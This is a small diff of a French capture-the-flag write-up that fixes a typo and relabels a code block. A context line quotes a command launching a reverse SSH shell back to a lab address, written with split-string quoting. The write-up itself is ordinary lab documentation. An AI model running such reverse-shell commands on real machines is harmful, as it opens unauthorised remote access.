@@ -79,7 +79,7 @@ Pour générer d'autres tables de fréquence il faut retrouver la clé du fichie
 
 On peut ensuite générer une table avec un ou plusieurs fichiers, le programme récupérant la liste depuis l'entrée standard.  
 
-```bash
+```console
 $ find . -name shakespeare.txt | ./genfreq > freq/english.freq
 ```
 
@@ -152,7 +152,7 @@ nohup /tmp/reverse-sshx64 -v -p 2244 '192.''168.56.1' &
 Dragonfly
 ---------
 
-Pas grand chose à dire sur les fichiers du site qui étaient présent. Il y a une appli Python ainsi que le premier flag :  
+Pas grand-chose à dire sur les fichiers du site qui étaient présent. Il y a une appli Python ainsi que le premier flag :  
 
 ```
 bash-5.1$ pwd 
